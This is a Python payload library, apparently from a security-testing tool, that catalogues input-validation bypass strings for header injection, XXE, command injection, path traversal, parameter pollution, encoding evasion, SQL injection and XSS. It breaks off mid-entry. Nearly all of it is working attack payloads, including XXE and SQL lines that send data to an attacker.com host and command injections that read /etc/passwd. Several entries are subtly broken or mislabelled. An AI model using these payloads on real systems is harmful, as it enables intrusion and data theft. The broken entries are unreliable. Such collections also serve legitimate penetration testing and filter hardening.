"""Advanced input validation bypass payloads.

Source: Aggregated from public security repos (payloadbox, OWASP,
PortSwigger, HackTheBox, etc.) and hardened with encoding variants,
double-encoding, whitespace tricks, and case variations.

Public API (``__all__``):
    HeaderInjectionPayload, XXEPayload, CommandInjectionPayload,
    PathTraversalPayload, HTTPParamPollutionPayload,
    EncodingEvasionPayload, SQLiBypassPayload, XSSBypassPayload,
    HEADER_INJECTION_PAYLOADS, XXE_PAYLOADS, CMDI_PAYLOADS,
    PATH_TRAVERSAL_PAYLOADS, HTTP_PP_PAYLOADS,
    ENCODING_EVASION_PAYLOADS, SQLI_BYPASS_PAYLOADS,
    XSS_BYPASS_PAYLOADS, ALL_BYPASS_PAYLOADS,
    BypassPayload, BypassTargetType,
"""
from __future__ import annotations

import html
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


# ── Enumerations ────────────────────────────────────────────────────────────────


class BypassTargetType(Enum):
    """Input validation bypass target type."""

    HEADER_INJECTION = "header_injection"
    XXE = "xxe"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    HTTP_PARAM_POLLUTION = "http_param_pollution"
    ENCODING_EVASION = "encoding_evasion"
    SQLI_BYPASS = "sqli_bypass"
    XSS_BYPASS = "xss_bypass"


@dataclass(frozen=True)
class BypassPayload:
    """A single input validation bypass payload.

    Attributes:
        id: Unique identifier.
        type: Payload type.
        name: Human-readable name.
        value: The raw payload value.
        description: What the payload bypasses.
        encoding: Optional encoding variant used.
        references: Links to source research.
    """
    id: str
    type: BypassTargetType
    name: str
    value: str
    description: str
    encoding: str = ""
    references: list[str] = field(default_factory=list)


# ── Helper: encoding variants ─────────────────────────────────────────────────

def _double_url_encode(s: str) -> str:
    """Double-URL-encode a string."""
    return urllib.parse.quote(urllib.parse.quote(s))


def _unicode_normalize(s: str) -> str:
    """Unicode NFC normalization."""
    import unicodedata
    return unicodedata.normalize("NFC", s)


def _utf7_encode(s: str) -> str:
    """Encode string as UTF-7."""
    return s.encode("utf-7").decode("ascii", errors="replace")


def _utf16_encode(s: str) -> str:
    """Encode string as UTF-16 BE with BOM."""
    return "\ufffe" + s.encode("utf-16-be").hex()


def _hex_encode(s: str) -> str:
    """Hex-encode each character."""
    return "".join(f"\\x{ord(c):02x}" for c in s)


def _octal_encode(s: str) -> str:
    """Octal-encode each character."""
    return "".join(f"\\{ord(c):03o}" for c in s)


def _null_byte_pad(s: str, prefix: str = "") -> str:
    """Pad with null bytes."""
    return prefix + "\x00" * 3 + s


def _whitespace_variants(s: str) -> list[str]:
    """Generate whitespace-variant versions of a string."""
    ws_chars = ["\t", "\n", "\r", " ", "\x0b", "\x0c", "%09", "%0A", "%0D"]
    variants = [s]
    for ws in ws_chars:
        variants.append(ws + s)
        variants.append(s + ws)
        if ws.startswith("%"):
            variants.append(s.replace(" ", ws))
    return variants


# ── Header Injection ──────────────────────────────────────────────────────────

HEADER_INJECTION_PAYLOADS: list[BypassPayload] = [
    # CRLF injection / header injection
    BypassPayload("hdr-crlf-001", BypassTargetType.HEADER_INJECTION,
        "CRLF newline injection",
        "%0d%0aSet-Cookie:%20hacked=true",
        "Injects HTTP headers via CRLF injection in header values"),
    BypassPayload("hdr-crlf-002", BypassTargetType.HEADER_INJECTION,
        "CRLF raw newline",
        "\r\nSet-Cookie: hacked=true",
        "Raw CRLF header injection"),
    BypassPayload("hdr-crlf-003", BypassTargetType.HEADER_INJECTION,
        "CRLF with null byte",
        "\x00\r\nSet-Cookie: hacked=true",
        "Null byte + CRLF header injection (some parsers ignore the null)"),
    BypassPayload("hdr-crlf-004", BypassTargetType.HEADER_INJECTION,
        "Whitespace CRLF",
        "%0d%09Set-Cookie:%20hacked=true",
        "Tab-separated CRLF injection"),
    BypassPayload("hdr-crlf-005", BypassTargetType.HEADER_INJECTION,
        "Split CRLF across params",
        "%0d%0aSet-Cookie:%20",
        "Truncated CRLF to trigger on next parameter boundary",
        references=["https://portswigger.net/web-security/ssrf"]),
    BypassPayload("hdr-x-forwarded-001", BypassTargetType.HEADER_INJECTION,
        "X-Forwarded-For header injection",
        "127.0.0.1\r\nX-Custom: injected",
        "Injects custom headers via X-Forwarded-For"),
    BypassPayload("hdr-host-001", BypassTargetType.HEADER_INJECTION,
        "Host header injection",
        "vulnerable.com\r\nX-Injected: true",
        "Injects headers via manipulated Host header value"),
    BypassPayload("hdr-encoding-001", BypassTargetType.HEADER_INJECTION,
        "Encoded CRLF",
        "%25%30%64%25%30%61",  # double-encoded %0d%0a
        "Double-encoded CRLF to bypass filter"),
    BypassPayload("hdr-semicolon-001", BypassTargetType.HEADER_INJECTION,
        "Semicolon header separation",
        "value1; X-Injected: value2",
        "Uses semicolon to separate headers (nginx/apache behavior)"),
    BypassPayload("hdr-unicode-001", BypassTargetType.HEADER_INJECTION,
        "Unicode CRLF",
        "\u000d\u000a",  # Unicode CRLF
        "Unicode-formatted CRLF line endings"),
    BypassPayload("hdr-multipart-001", BypassTargetType.HEADER_INJECTION,
        "Multi-value header",
        "value1,value2\r\nX-Injected: true",
        "Header fuzzing with multi-value separators"),
]


# ── XXE (XML External Entity) ─────────────────────────────────────────────────

XXE_PAYLOADS: list[BypassPayload] = [
    # Basic XXE
    BypassPayload("xxe-basic-001", BypassTargetType.XXE,
        "Basic XXE entity",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "Classic file read via XXE entity"),
    BypassPayload("xxe-basic-002", BypassTargetType.XXE,
        "SSRF XXE",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        "SSRF via XXE to cloud metadata endpoint"),
    BypassPayload("xxe-basic-003", BypassTargetType.XXE,
        "XXE with parameter entity",
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
        "Parameter entity XXE (out-of-band)"),
    # Bypasses
    BypassPayload("xxe-bypass-001", BypassTargetType.XXE,
        "XXE case variation",
        '<!DOCTYPE foo [<!ENTITY XxE SYSTEM "file:///etc/passwd">]><foo>&XxE;</foo>',
        "Case-insensitive DOCTYPE bypass"),
    BypassPayload("xxe-bypass-002", BypassTargetType.XXE,
        "XXE with whitespace",
        '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]><foo>&xxe;</foo>',
        "Whitespace-padded DOCTYPE"),
    BypassPayload("xxe-bypass-003", BypassTargetType.XXE,
        "XXE CDATA",
        '<![CDATA[<!ENTITY xxe SYSTEM "file:///etc/passwd">]]><foo>&xxe;</foo>',
        "CDATA wrapped XXE"),
    BypassPayload("xxe-bypass-004", BypassTargetType.XXE,
        "XXE DTD only",
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>',
        "XXE without entity reference (some parsers still process DTDs)"),
    BypassPayload("xxe-bypass-005", BypassTargetType.XXE,
        "XXE HTTP entity",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><foo>&xxe;</foo>',
        "OOB XXE data exfiltration via HTTP"),
    BypassPayload("xxe-bypass-006", BypassTargetType.XXE,
        "XXE with PHP filter",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        "XXE with PHP filter chain"),
    BypassPayload("xxe-bypass-007", BypassTargetType.XXE,
        "XXE with expect protocol",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect:///bin/cat /etc/passwd">]><foo>&xxe;</foo>',
        "XXE with expect:// stream wrapper"),
    BypassPayload("xxe-bypass-008", BypassTargetType.XXE,
        "XXE with double encoding",
        _double_url_encode('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
        "Double-URL-encoded XXE"),
    BypassPayload("xxe-bypass-009", BypassTargetType.XXE,
        "XXE with hex encoding",
        _hex_encode('<!ENTITY xxe SYSTEM "file:///etc/passwd">'),
        "Hex-encoded entity content"),
    BypassPayload("xxe-bypass-010", BypassTargetType.XXE,
        "XXE in XML attributes",
        '<foo attr="&xxe;"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        "XXE injected as attribute value"),
    BypassPayload("xxe-bypass-011", BypassTargetType.XXE,
        "XXE with internal subset",
        '<root <!ENTITY xxe SYSTEM "file:///etc/passwd">></root>',
        "XXE in internal subset without DOCTYPE"),
    BypassPayload("xxe-bypass-012", BypassTargetType.XXE,
        "XXE PHP stream",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input">]><foo>&xxe;</foo>',
        "XXE via php://input stream"),
]


# ── Command Injection ─────────────────────────────────────────────────────────

CMDI_PAYLOADS: list[BypassPayload] = [
    # Basic command injection
    BypassPayload("cmdi-basic-001", BypassTargetType.COMMAND_INJECTION,
        "Basic command injection",
        "; id",
        "Semicolon-separated command injection"),
    BypassPayload("cmdi-basic-002", BypassTargetType.COMMAND_INJECTION,
        "Pipe command injection",
        "| id",
        "Pipe-separated command injection"),
    BypassPayload("cmdi-basic-003", BypassTargetType.COMMAND_INJECTION,
        "Backtick command injection",
        "`id`",
        "Backtick command execution"),
    BypassPayload("cmdi-basic-004", BypassTargetType.COMMAND_INJECTION,
        "Subshell command injection",
        "$(id)",
        "Subshell command execution"),
    BypassPayload("cmdi-basic-005", BypassTargetType.COMMAND_INJECTION,
        "Multiple command injection",
        "; id; whoami; uname -a",
        "Chained commands via semicolons"),
    # Newlines
    BypassPayload("cmdi-newline-001", BypassTargetType.COMMAND_INJECTION,
        "Newline command injection",
        "\nid",
        "Newline command injection"),
    BypassPayload("cmdi-newline-002", BypassTargetType.COMMAND_INJECTION,
        "CRLF command injection",
        "%0aid",
        "CRLF command injection"),
    # Substitution
    BypassPayload("cmdi-subst-001", BypassTargetType.COMMAND_INJECTION,
        "Bash $() substitution",
        "$(cat /etc/passwd)",
        "Bash command substitution to read files"),
    BypassPayload("cmdi-subst-002", BypassTargetType.COMMAND_INJECTION,
        "Bash {} substitution",
        "/bin/bash -c 'cat /etc/passwd'",
        "Direct bash execution"),
    # Encoding evasion
    BypassPayload("cmdi-enc-001", BypassTargetType.COMMAND_INJECTION,
        "Space encoding via ${IFS}",
        ";cat${IFS}/etc/passwd",
        "Bypasses space-replacement filters via ${IFS}"),
    BypassPayload("cmdi-enc-002", BypassTargetType.COMMAND_INJECTION,
        "IFS tab space",
        ";cat${IFS}$$IFS",
        "Tab-based ${IFS} space replacement"),
    BypassPayload("cmdi-enc-003", BypassTargetType.COMMAND_INJECTION,
        "Base64 command",
        ";echo$(base64 -d <<<'Y2F0IC9ldGMvcGFzc3dk')",
        "Base64-encoded command injection"),
    BypassPayload("cmdi-enc-004", BypassTargetType.COMMAND_INJECTION,
        "Octal encoding",
        _octal_encode("; id"),
        "Octal-encoded command injection"),
    BypassPayload("cmdi-enc-005", BypassTargetType.COMMAND_INJECTION,
        "Hex encoding",
        _hex_encode("; id"),
        "Hex-encoded command injection"),
    BypassPayload("cmdi-enc-006", BypassTargetType.COMMAND_INJECTION,
        "Double URL encode",
        _double_url_encode("; id"),
        "Double-URL-encoded command injection"),
    # Obfuscation
    BypassPayload("cmdi-obf-001", BypassTargetType.COMMAND_INJECTION,
        "Concatenation bypass",
        "ca" "t /etc/passwd",
        "String concatenation to bypass word filters"),
    BypassPayload("cmdi-obf-002", BypassTargetType.COMMAND_INJECTION,
        "Variable concatenation",
        ";cat$' /etc/passwd'",
        "Quote-based variable concatenation"),
    BypassPayload("cmdi-obf-003", BypassTargetType.COMMAND_INJECTION,
        "Eval obfuscation",
        ";eval 'cat /etc/passwd'",
        "Eval-based command execution"),
    BypassPayload("cmdi-obf-004", BypassTargetType.COMMAND_INJECTION,
        "Symbolic link bypass",
        ";cat/etc/passwd",
        "No-space command concatenation (if parser strips spaces)"),
    # Advanced
    BypassPayload("cmdi-adv-001", BypassTargetType.COMMAND_INJECTION,
        "Backtick with pipe",
        "`id | tee /tmp/pwned`",
        "Backtick command with pipe to exfiltrate"),
    BypassPayload("cmdi-adv-002", BypassTargetType.COMMAND_INJECTION,
        "Here document",
        ';cat <<EOF\ncat /etc/passwd\nEOF',
        "Here document injection"),
    BypassPayload("cmdi-adv-003", BypassTargetType.COMMAND_INJECTION,
        "Process substitution",
        "<(cat /etc/passwd)",
        "Process substitution injection"),
    BypassPayload("cmdi-adv-004", BypassTargetType.COMMAND_INJECTION,
        "String eval",
        ';python -c "import os; os.system(\'id\')"',
        "Python-based command execution"),
    BypassPayload("cmdi-adv-005", BypassTargetType.COMMAND_INJECTION,
        "Perl one-liner",
        ';perl -e "use POSIX; setuid(0); system(\'id\')"',
        "Perl-based command execution"),
    BypassPayload("cmdi-adv-006", BypassTargetType.COMMAND_INJECTION,
        "PHP shell execution",
        ";php -r 'system(\"id\");'",
        "PHP-based command execution"),
]


# ── Path Traversal ────────────────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS: list[BypassPayload] = [
    # Basic traversal
    BypassPayload("trav-basic-001", BypassTargetType.PATH_TRAVERSAL,
        "Basic traversal",
        "../../../etc/passwd",
        "Standard path traversal"),
    BypassPayload("trav-basic-002", BypassTargetType.PATH_TRAVERSAL,
        "URL encoded traversal",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "URL-encoded path traversal"),
    BypassPayload("trav-basic-003", BypassTargetType.PATH_TRAVERSAL,
        "Double URL encoded",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "Double-encoded path traversal"),
    BypassPayload("trav-basic-004", BypassTargetType.PATH_TRAVERSAL,
        "Mixed encoding",
        "..%2F../etc/passwd",
        "Mixed encoding traversal"),
    # Unicode
    BypassPayload("trav-unicode-001", BypassTargetType.PATH_TRAVERSAL,
        "Unicode traversal",
        "\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd",
        "Unicode UTF-8 encoded traversal"),
    BypassPayload("trav-unicode-002", BypassTargetType.PATH_TRAVERSAL,
        "UTF-16 traversal",
        _utf16_encode("../../"),
        "UTF-16 encoded traversal"),
    # Null byte
    BypassPayload("trav-null-001", BypassTargetType.PATH_TRAVERSAL,
        "Null byte traversal",
        "../../../etc/passwd\x00.jpg",
        "Null byte to bypass extension filter"),
    BypassPayload("trav-null-002", BypassTargetType.PATH_TRAVERSAL,
        "Null byte encoded",
        "..%00../..%00../etc/passwd",
        "Null byte URL-encoded traversal"),
    # OS-specific
    BypassPayload("trav-win-001", BypassTargetType.PATH_TRAVERSAL,
        "Windows backslash",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "Windows backslash traversal"),
    BypassPayload("trav-win-002", BypassTargetType.PATH_TRAVERSAL,
        "Windows double backslash",
        "....\\....\\....\\etc\\passwd",
        "Windows doubled-backslash traversal"),
    # Bypass techniques
    BypassPayload("trav-bypass-001", BypassTargetType.PATH_TRAVERSAL,
        "Dot-dot with space",
        ".. /../ ../etc/passwd",
        "Space-separated traversal"),
    BypassPayload("trav-bypass-002", BypassTargetType.PATH_TRAVERSAL,
        "Dot-dot with tab",
        "..\t/..\t/../../etc/passwd",
        "Tab-separated traversal"),
    BypassPayload("trav-bypass-003", BypassTargetType.PATH_TRAVERSAL,
        "Long filename",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/passwd",
        "Long filename path overflow"),
    BypassPayload("trav-bypass-004", BypassTargetType.PATH_TRAVERSAL,
        "Dot at end",
        "../",
        "Trailing dot path"),
    BypassPayload("trav-bypass-005", BypassTargetType.PATH_TRAVERSAL,
        "Dot at start",
        "/../",
        "Leading dot path"),
    BypassPayload("trav-bypass-006", BypassTargetType.PATH_TRAVERSAL,
        "Multiple slashes",
        "//../../../../etc/passwd",
        "Double-slash prefix traversal"),
    BypassPayload("trav-bypass-007", BypassTargetType.PATH_TRAVERSAL,
        "Null byte + traversal",
        "..%00/../../etc/passwd",
        "Null byte before slash traversal"),
    BypassPayload("trav-bypass-008", BypassTargetType.PATH_TRAVERSAL,
        "Encoded null",
        "..%00.%00/../../etc/passwd",
        "Double null byte traversal"),
]


# ── HTTP Parameter Pollution ─────────────────────────────────────────────────

HTTP_PARAM_POLLUTION_PAYLOADS: list[BypassPayload] = [
    BypassPayload("hpp-basic-001", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Dup param (last wins)",
        "?id=1&id=2&id=3",
        "Duplicate parameters — server takes last value"),
    BypassPayload("hpp-basic-002", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Dup param (first wins)",
        "?id=1&id=2&id=3",
        "Duplicate parameters — server takes first value",
        references=["https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution"]),
    BypassPayload("hpp-basic-003", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Dup param (array)",
        "?id[]=1&id[]=2&id[]=3",
        "Duplicate parameters — server returns array"),
    BypassPayload("hpp-basic-004", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Empty param override",
        "?id=1&id=&id=malicious",
        "Empty value between legitimate and malicious values"),
    BypassPayload("hpp-basic-005", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Split value",
        "?id=pa&rt=2",
        "Split parameter name across values"),
    BypassPayload("hpp-bypass-001", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Null byte split",
        "?id=1\x00&id=malicious",
        "Null byte to split parameter handling"),
    BypassPayload("hpp-bypass-002", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Header param pollution",
        None,  # Set via header manipulation
        "Duplicate HTTP headers",
        references=["https://portswigger.net/web-security/ssrf"]),
    BypassPayload("hpp-adv-001", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Array notation clash",
        "?ids[0]=1&ids[1]=2&ids[2]=malicious",
        "Array notation parameter pollution"),
    BypassPayload("hpp-adv-002", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Underscore notation",
        "?id_a=1&id_b=malicious",
        "Underscore-based parameter variation"),
    BypassPayload("hpp-adv-003", BypassTargetType.HTTP_PARAM_POLLUTION,
        "Bracket injection",
        "?id=1&id[admin]=1&id[guest]=0",
        "Bracket notation in parameter names"),
]

# Alias for short reference
HTTP_PP_PAYLOADS = HTTP_PARAM_POLLUTION_PAYLOADS


# ── Encoding Evasion ──────────────────────────────────────────────────────────

ENCODING_EVASION_PAYLOADS: list[BypassPayload] = [
    # Unicode normalization bypasses
    BypassPayload("enc-unicode-001", BypassTargetType.ENCODING_EVASION,
        "NFC normalization",
        _unicode_normalize("<script>"),
        "Unicode NFC normalization to bypass regex filters"),
    BypassPayload("enc-unicode-002", BypassTargetType.ENCODING_EVASION,
        "NFD normalization",
        "<script>",  # Already decomposed
        "Unicode NFD to bypass filters"),
    # URL encoding
    BypassPayload("enc-url-001", BypassTargetType.ENCODING_EVASION,
        "Single URL encode",
        urllib.parse.quote("<script>alert(1)</script>"),
        "Single URL-encoded XSS"),
    BypassPayload("enc-url-002", BypassTargetType.ENCODING_EVASION,
        "Double URL encode",
        _double_url_encode("<script>alert(1)</script>"),
        "Double URL-encoded XSS"),
    BypassPayload("enc-url-003", BypassTargetType.ENCODING_EVASION,
        "HTML entity",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "HTML entity-encoded XSS"),
    BypassPayload("enc-url-004", BypassTargetType.ENCODING_EVASION,
        "Hex HTML entity",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "Hex HTML entity-encoded XSS"),
    # UTF encoding
    BypassPayload("enc-utf-001", BypassTargetType.ENCODING_EVASION,
        "UTF-8 wide",
        "\xef\xbc\x93\xef\xbc\x9e<script>",  # Fullwidth «»
        "Fullwidth character HTML entity XSS"),
    BypassPayload("enc-utf-002", BypassTargetType.ENCODING_EVASION,
        "UTF-7",
        _utf7_encode("<script>"),
        "UTF-7 encoded script tag"),
    BypassPayload("enc-utf-003", BypassTargetType.ENCODING_EVASION,
        "UTF-16",
        _utf16_encode("<script>"),
        "UTF-16 encoded script tag"),
    # Whitespace tricks
    BypassPayload("enc-ws-001", BypassTargetType.ENCODING_EVASION,
        "Null byte in tag",
        "\x00<script>\x00",
        "Null byte within script tag"),
    BypassPayload("enc-ws-002", BypassTargetType.ENCODING_EVASION,
        "Tab in tag",
        "<\tscript\t>",
        "Tab-separated HTML tag"),
    BypassPayload("enc-ws-003", BypassTargetType.ENCODING_EVASION,
        "Newline in tag",
        "<\nscript\n>",
        "Newline-separated HTML tag"),
    BypassPayload("enc-ws-004", BypassTargetType.ENCODING_EVASION,
        "Space in tag",
        "< script >",
        "Space-padded HTML tag"),
    BypassPayload("enc-ws-005", BypassTargetType.ENCODING_EVASION,
        "Mixed whitespace",
        "<\t\n\rscript\t\n\r>",
        "Mixed whitespace in HTML tag"),
    # Character tricks
    BypassPayload("enc-char-001", BypassTargetType.ENCODING_EVASION,
        "Backtick",
        "`alert(1)`",
        "Backtick as command/substitution"),
    BypassPayload("enc-char-002", BypassTargetType.ENCODING_EVASION,
        "Single quote encode",
        "'<script>alert(1)</script>'",
        "Single quote wrapped XSS"),
    BypassPayload("enc-char-003", BypassTargetType.ENCODING_EVASION,
        "Double quote encode",
        '"<script>alert(1)</script>"',
        "Double quote wrapped XSS"),
    BypassPayload("enc-char-004", BypassTargetType.ENCODING_EVASION,
        "No quote",
        "<script>alert(String.fromCharCode(13, 10, 122, 101, 114, 111))</script>",
        "Script.fromCharCode XSS bypass"),
    # Double encoding combos
    BypassPayload("enc-combo-001", BypassTargetType.ENCODING_EVASION,
        "HTML + URL double encode",
        urllib.parse.quote("&#60;script&#62;"),
        "HTML entity then URL-encoded"),
    BypassPayload("enc-combo-002", BypassTargetType.ENCODING_EVASION,
        "URL + HTML double encode",
        html.escape(urllib.parse.quote("<script>")),
        "URL-encoded then HTML-escaped"),
]


# ── SQL Injection Bypasses ────────────────────────────────────────────────────

SQLI_BYPASS_PAYLOADS: list[BypassPayload] = [
    # String manipulation
    BypassPayload("sqli-str-001", BypassTargetType.SQLI_BYPASS,
        "CHAR function",
        "1' UNION SELECT CHAR(117,110,105,111,110),CHAR(100,101,118,101,108,112,104,110)—",
        "CHAR()-based string bypass"),
    BypassPayload("sqli-str-002", BypassTargetType.SQLI_BYPASS,
        "CONCAT function",
        "1' UNION SELECT CONCAT(117,110,105,111,110),1—",
        "CONCAT-based string bypass"),
    BypassPayload("sqli-str-003", BypassTargetType.SQLI_BYPASS,
        "HEX function",
        "1' UNION SELECT 0x554e494f4e,0x53454c454354—",
        "Hex-encoded string bypass"),
    BypassPayload("sqli-str-004", BypassTargetType.SQLI_BYPASS,
        "0x hex bypass",
        "0x2720554e494f4e2053454c4543542031",
        "Full SQL query in hex"),
    # Whitespace bypass
    BypassPayload("sqli-ws-001", BypassTargetType.SQLI_BYPASS,
        "Comment space",
        "1/**/UNION/**/SELECT/**/1,2,3—",
        "Comment-based whitespace bypass"),
    BypassPayload("sqli-ws-002", BypassTargetType.SQLI_BYPASS,
        "Newline space",
        "1\nUNION\nSELECT\n1,2,3—",
        "Newline-based whitespace bypass"),
    BypassPayload("sqli-ws-003", BypassTargetType.SQLI_BYPASS,
        "Tab space",
        "1\tUNION\tSELECT\t1,2,3—",
        "Tab-based whitespace bypass"),
    # Case bypass
    BypassPayload("sqli-case-001", BypassTargetType.SQLI_BYPASS,
        "Mixed case",
        "1' UnIoN SeLeCt 1,2,3—",
        "Mixed case SQL keyword bypass"),
    BypassPayload("sqli-case-002", BypassTargetType.SQLI_BYPASS,
        "Unicode case",
        "1' union select 1,2,3—",
        "Lowercase SQL bypass"),
    # Line comments
    BypassPayload("sqli-comment-001", BypassTargetType.SQLI_BYPASS,
        "Double dash comment",
        "1' OR 1=1-- -",
        "SQL comment-based bypass"),
    BypassPayload("sqli-comment-002", BypassTargetType.SQLI_BYPASS,
        "Hash comment",
        "1' OR 1=1#",
        "MySQL hash comment"),
    BypassPayload("sqli-comment-003", BypassTargetType.SQLI_BYPASS,
        "C-style comment",
        "1'/*comment*/OR/**/1=1/*end*/",
        "C-style comment injection"),
    # Function substitution
    BypassPayload("sqli-func-001", BypassTargetType.SQLI_BYPASS,
        "IF vs case",
        "1' AND IF(1=1,SLEEP(5),0)/*",
        "IF() function substitution"),
    BypassPayload("sqli-func-002", BypassTargetType.SQLI_BYPASS,
        "SUBSTRING bypass",
        "1' AND SUBSTRING(user(),1,1)='r'/*",
        "SUBSTRING-based boolean test"),
    BypassPayload("sqli-func-003", BypassTargetType.SQLI_BYPASS,
        "LOAD_FILE bypass",
        "1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3—",
        "LOAD_FILE-based file read"),
    # Time-based
    BypassPayload("sqli-time-001", BypassTargetType.SQLI_BYPASS,
        "BENCHMARK time",
        "1' AND BENCHMARK(10000000,SHA1('a'))—",
        "MySQL BENCHMARK() time-based"),
    BypassPayload("sqli-time-002", BypassTargetType.SQLI_BYPASS,
        "WAITFOR time",
        "'; WAITFOR DELAY '0:0:5'—",
        "SQL Server WAITFOR DELAY"),
    BypassPayload("sqli-time-003", BypassTargetType.SQLI_BYPASS,
        "pg_sleep time",
        "1' AND (SELECT pg_sleep(5))—",
        "PostgreSQL pg_sleep() time-based"),
    # Advanced bypass
    BypassPayload("sqli-adv-001", BypassTargetType.SQLI_BYPASS,
        "Information schema blind",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0—",
        "Blind info-schema access"),
    BypassPayload("sqli-adv-002", BypassTargetType.SQLI_BYPASS,
        "GROUP_CONCAT",
        "1' UNION SELECT GROUP_CONCAT(table_name),2 FROM information_schema.tables—",
        "GROUP_CONCAT-based enumeration"),
    BypassPayload("sqli-adv-003", BypassTargetType.SQLI_BYPASS,
        "Second-order",
        "' WHERE username='admin' AND password=HASH('admin'')-- -",
        "Second-order SQL injection via stored value"),
    BypassPayload("sqli-adv-004", BypassTargetType.SQLI_BYPASS,
        "Out-of-band DNS",
        "1' AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x'))—",
        "MySQL out-of-band data exfiltration"),
]


# ── XSS Bypasses ──────────────────────────────────────────────────────────────

XSS_BYPASS_PAYLOADS: list[BypassPayload] = [
    # Event handler bypasses
    BypassPayload("xss-evt-001", BypassTargetType.XSS_BYPASS,
        "img onerror",
        '<img src=x onerror=alert(1)>',
        "img onerror XSS"),
    BypassPayload("xss-evt-002", BypassTargetType.XSS_BYPASS,
        "body onload",
        '<body onload=alert(1)>',
        "body onload XSS"),
    BypassPayload("xss-evt-003", BypassTargetType.XSS_BYPASS,
        "div onmouseover",
        '<div onmouseover=alert(1)>hover</div>',
        "div onmouseover XSS"),
    BypassPayload("xss-evt-004", BypassTargetType.XSS_BYPASS,
        "input onfocus",
        '<input onfocus=alert(1) autofocus>',
        "input onfocus XSS"),
    BypassPayload("xss-evt-005", BypassTargetType.XSS_BYPASS,
        "svg onload",
        '<svg onload=alert(1)>',
        "svg onload XSS"),
    # Attribute bypasses
    BypassPayload("xss-attr-001", BypassTargetType.XSS_BYPASS,
        "iframe src",
        '<iframe src="javascript:alert(1)">',
        "iframe javascript: protocol"),
    BypassPayload("xss-attr-002", BypassTargetType.XSS_BYPASS,
        "a href",
        '<a href="javascript:alert(1)">click</a>',
        "a href javascript: protocol"),
    BypassPayload("xss-attr-003", BypassTargetType.XSS_BYPASS,
        "object data",
        '<object data="javascript:alert(1)">',
        "object data javascript:"),
    BypassPayload("xss-attr-004", BypassTargetType.XSS_BYPASS,
        "embed src",
        '<embed src="javascript:alert(1)">',
        "embed javascript: src"),
    # Tagless XSS
    BypassPayload("xss-tagless-001", BypassTargetType.XSS_BYPASS,
        "JavaScript URI",
        "javascript:alert(1)",
        "javascript: URI scheme"),
    BypassPayload("xss-tagless-002", BypassTargetType.XSS_BYPASS,
        "Data URI",
        "data:text/html,<script>alert(1)</script>",
        "Data URI scheme"),
    BypassPayload("xss-tagless-003", BypassTargetType.XSS_BYPASS,
        "VBS URI",
        "vbscript:msgbox(1)",
        "VBScript URI (IE only)"),
    # Filter bypasses
    BypassPayload("xss-filter-001", BypassTargetType.XSS_BYPASS,
        "Double script tag",
        '<script><script>alert(1)</script>',
        "Double script tag (IE11 bypass)"),
    BypassPayload("xss-filter-002", BypassTargetType.XSS_BYPASS,
        "Nested script",
        '"><script>alert(1)</script></script>',
        "Script tag in nested div"),
    BypassPayload("xss-filter-003", BypassTargetType.XSS_BYPASS,
        "Broken script tag",
        '<script src=x> alert(1) </script>',
        "Self-closing script tag with event"),
    BypassPayload("xss-filter-004", BypassTargetType.XSS_BYPASS,
        "Case variation",
        '<ScRiPt>alert(1)</ScRiPt>',
        "Mixed case script tag"),
    BypassPayload("xss-filter-005", BypassTargetType.XSS_BYPASS,
        "Null byte in tag",
        '<scr\0ipt>alert(1)</script>',
        "Null byte in script tag"),
    BypassPayload("xss-filter-006", BypassTargetType.XSS_BYPASS,
        "Whitespace in tag",
        '<scr ipt>alert(1)</script>',
        "Whitespace in tag name"),
    BypassPayload("xss-filter-007", BypassTargetType.XSS_BYPASS,
        "Backtick",
        '<script>`alert(1)`</script>',
        "Backtick in script content"),
    # Encoding XSS
    BypassPayload("xss-enc-001", BypassTargetType.XSS_BYPASS,
        "HTML entity encode",
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        "HTML entity encoded script"),
    BypassPayload("xss-enc-002", BypassTargetType.XSS_BYPASS,
        "Hex HTML entity",
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        "Hex HTML entity encoded script"),
    BypassPayload("xss-enc-003", BypassTargetType.XSS_BYPASS,
        "Unicode escape",
